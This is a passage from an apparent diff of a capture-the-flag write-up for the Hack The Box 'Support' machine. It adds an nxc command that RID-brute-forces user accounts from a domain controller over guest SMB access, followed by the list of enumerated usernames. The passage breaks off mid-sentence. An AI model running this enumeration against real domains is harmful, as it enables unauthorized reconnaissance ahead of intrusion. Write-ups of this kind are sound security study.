@@ -96,5 +96,28 @@ SMB         10.129.230.181  445    DC               SYSVOL                      
 Read access on a non-default share
 
 ```python
-
+nxc smb dc.support.htb -u 'Guest' -p '' --rid-brute 20000 | grep '(SidTypeUser)' | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users.txt
+Administrator
+Guest
+krbtgt
+DC$
+ldap
+support
+smith.rosario
+hernandez.stanley
+wilson.shelby
+anderson.damian
+thomas.raphael
+levine.leopoldo
+raven.clifton
+bardot.mary
+cromwell.gerard
+monroe.david
+west.laura
+langley.lucy
+daughtler.mabel
+stoll.rachelle
+ford.victoria
 ```
+
+Ill pull out the users using `--rid-brute` to make s
